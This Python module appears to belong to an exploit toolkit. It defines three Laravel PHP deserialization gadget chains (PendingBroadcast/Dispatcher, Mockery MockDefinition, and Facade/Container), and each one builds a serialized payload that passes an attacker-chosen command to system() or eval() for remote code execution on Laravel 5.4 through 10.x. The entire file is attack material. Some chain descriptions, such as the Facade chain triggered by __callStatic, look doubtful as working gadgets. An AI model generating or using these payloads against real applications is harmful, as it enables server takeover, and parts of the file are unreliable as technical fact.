"""Laravel POP chains (5.4.x - 10.x).

Helper functions: _s, _O(cls,n,props), _a(count,flat), _e(k,v),
  _protected, _private, _N, _b, _i.
"""
from . import POPChain

LARAVEL_CHAINS: list = [
    # ==================================================================
    # laravel_rce_pendingbroadcast — Laravel 5.4 - 5.8
    # PendingBroadcast: 2 properties (events, event)
    # Dispatcher: 2 properties (resolver, listeners)
    # ==================================================================
    POPChain(
        name="laravel_rce_pendingbroadcast",
        framework="Laravel",
        gadget_classes=["Illuminate\\Broadcasting\\PendingBroadcast", "Illuminate\\Events\\Dispatcher"],
        entry_point="__destruct",
        sink="call_user_func(callback)",
        command_param="callback",
        serialize_code=(
            '_O(b"Illuminate\\\\Broadcasting\\\\PendingBroadcast", 2,'
            '_s(_private("Illuminate\\\\Broadcasting\\\\PendingBroadcast", b"events")) + '
            '_O(b"Illuminate\\\\Events\\\\Dispatcher", 2,'
            '_s(_private("Illuminate\\\\Events\\\\Dispatcher", b"resolver")) + _s(__command__) + '
            '_s(_private("Illuminate\\\\Events\\\\Dispatcher", b"listeners")) + '
            '_a(1, _e(_i(0), _s(b"system")))'
            ') + '
            '_s(_private("Illuminate\\\\Broadcasting\\\\PendingBroadcast", b"event")) + _s(b"system")'
            ')'
        ),
        notes="Laravel 5.4-5.8. PendingBroadcast::__destruct -> Dispatcher::dispatch -> call_user_func('system', cmd).",
    ),

    # ==================================================================
    # laravel_rce_mockobject — Laravel 8.x - 10.x (Mockery)
    # MockDefinition: 2 properties (config=null, code=eval string)
    # ==================================================================
    POPChain(
        name="laravel_rce_mockobject",
        framework="Laravel",
        gadget_classes=["Mockery\\MockObject", "Mockery\\Generator\\MockDefinition"],
        entry_point="__destruct",
        sink="eval(code)",
        command_param="code",
        serialize_code=(
            '_O(b"Mockery\\\\Generator\\\\MockDefinition", 2,'
            '_s(_protected("config")) + _N() + '
            '_s(_protected("code")) + '
            '_s(b"<?php system(\\"" + __command__.encode() + b"\\"); ?>")'
            ')'
        ),
        notes="Laravel 8.x-10.x via Mockery. MockDefinition::__destruct -> eval().",
    ),

    # ==================================================================
    # laravel_rce_illuminate_support — Laravel Facade-based chain
    # Facade: 1 property (app/container)
    # Container: 1 property (instances array)
    # ==================================================================
    POPChain(
        name="laravel_rce_illuminate_support",
        framework="Laravel",
        gadget_classes=["Illuminate\\Support\\Facades\\Facade"],
        entry_point="__callStatic",
        sink="system(...)",
        command_param="callback",
        serialize_code=(
            '_O(b"Illuminate\\\\Support\\\\Facades\\\\Facade", 1,'
            '_s(_protected("app")) + '
            '_O(b"Illuminate\\\\Container\\\\Container", 1,'
            '_s(_protected("instances")) + _a(1, _e(_s(b"system"), _s(__command__)))'
            ')'
            ')'
        ),
        notes="Laravel Facade POP chain. __callStatic -> Container::resolve -> callable invoke.",
    ),
]
